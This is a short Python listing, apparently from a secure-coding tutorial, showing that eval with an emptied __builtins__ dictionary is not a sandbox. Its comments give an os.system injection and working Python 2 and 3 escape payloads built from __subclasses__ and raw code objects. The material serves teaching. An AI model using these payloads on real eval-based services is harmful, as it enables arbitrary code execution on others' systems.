# Code Listing #4

"""

Code testing the 'eval' function for security holes - version #2

"""

import sys


def run_code(string):
    """ Evaluate the passed string as code """

    try:
        # Pass __builtins__ dictionary as empty
        eval(string, {'__builtins__': {}})
    except Exception as e:
        print(repr(e))


if __name__ == "__main__":
    run_code(sys.argv[1])

    # no pwn
    # python2 04-test_eval2.py "__import__('os').system('ls -a')"
    # pwn
    # python2 04-test_eval2.py "(lambda f=(lambda x: [c for c in [].__class__.__bases__[0].__subclasses__() if c.__name__ == x][0]): f('function')(f('code')(0,0,0,0,'BOOM',(), (),(),'','',0,''),{})())()"
    # python3 04-test_eval2.py "(lambda f=(lambda x: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == x][0]): f('function')(f('code')(0,0,0,0,0,b't\x00\x00j\x01\x00d\x01\x00\x83\x01\x00\x01d\x00\x00S',(), (),(),'','',0,b''),{})())()"